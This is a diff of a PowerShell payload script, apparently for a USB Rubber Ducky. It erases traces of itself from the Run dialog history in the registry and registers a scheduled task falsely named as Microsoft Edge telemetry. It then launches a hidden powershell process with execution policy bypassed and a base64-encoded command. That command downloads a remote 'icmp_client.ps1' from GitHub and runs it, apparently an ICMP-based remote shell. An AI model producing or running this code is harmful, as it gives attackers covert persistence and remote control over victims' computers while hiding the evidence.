@@ -1,3 +1,7 @@
+# Remove rubber ducky usage leftovers
+$property_name = (Get-ItemProperty "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "MRUList").MRUList.SubString(0,1)
+Set-ItemProperty "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name $property_name -Value "%appdata%"
+
 # Unregister previous task if present
 if(Get-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' -Confirm:$false
@@ -13,7 +17,3 @@ Register-ScheduledTask -TaskName 'MicrosoftEdgeTelemetryServiceTaskMachineCore' 
 
 # Run actual code
 powershell -w h -nol -noni -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA
-
-# Remove rubber ducky usage leftovers
-$property_name = (Get-ItemProperty "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "MRUList").MRUList.SubString(0,1)
-Set-ItemProperty "Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name $property_name -Value "%appdata%"
